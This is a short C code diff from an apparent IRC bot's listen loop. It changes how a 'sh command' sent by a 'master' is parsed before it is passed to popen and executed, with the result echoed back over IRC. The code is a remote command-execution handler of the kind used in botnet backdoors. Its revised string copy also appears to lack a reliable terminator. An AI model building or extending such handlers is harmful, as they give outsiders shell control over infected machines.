@@ -197,13 +197,11 @@ int irc_listen(irc_info *info) {
 			// handling sh command
 			if (!strncmp(":!", master_cmd[3], 2)) {
 
-				sprintf(message, "Executing command: %s", (str_ret + 2));
+				sprintf(message, "Executing command: %s", (master_cmd[3] + 2));
 
 				irc_send(message, strlen(message), info);
 
-				strncpy(command, (str_ret + 2), strlen(str_ret) - 3);
-
-				command[strlen(str_ret) - 4] = '\0';
+				strncpy(command, (master_cmd[3] + 2), strlen(master_cmd[3]) - 1);
 
 				if (!(file_popen = popen(command, "r"))) {
 
